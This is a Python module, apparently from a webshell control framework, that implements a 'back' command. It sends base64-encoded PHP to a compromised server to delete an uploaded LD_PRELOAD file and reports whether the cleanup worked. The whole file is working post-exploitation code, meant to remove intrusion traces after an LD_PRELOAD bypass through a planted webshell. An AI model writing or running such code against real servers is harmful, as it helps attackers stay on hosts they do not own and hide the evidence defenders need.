from libs.config import alias, gget, color, set_namespace
from libs.myapp import send, get_system_code, is_windows, base64_encode


def get_clean_ld_preload_php(filename: str):
    system_clean_command = f"del /F /Q {filename}" if is_windows() else f"rm -f {filename}" + " && echo success"
    return """$f=base64_decode("%s");
if (!unlink($f)){
    %s
}else{echo "success";}
""" % (base64_encode(filename), get_system_code(system_clean_command))


# ? alias装饰器第一个参数为none_named_arg(true/FALSE),True即把没有参数名时传入的参数值顺序传入
@alias(func_alias="b")
def run():
    """
    back

    Back to main menu.
    """
    ld_preload_filename = gget("webshell.ld_preload_path", "webshell", None)
    if (ld_preload_filename):
        print(color.yellow("\nClean LD_PRELOAD traces...\n"))
        res = send(get_clean_ld_preload_php(ld_preload_filename))
        if (res):
            text = res.r_text.strip()
            if ("success" in text):
                print(color.green("Clean success\n"))
            else:
                print(color.red("Clean failed\n"))
    set_namespace("main")
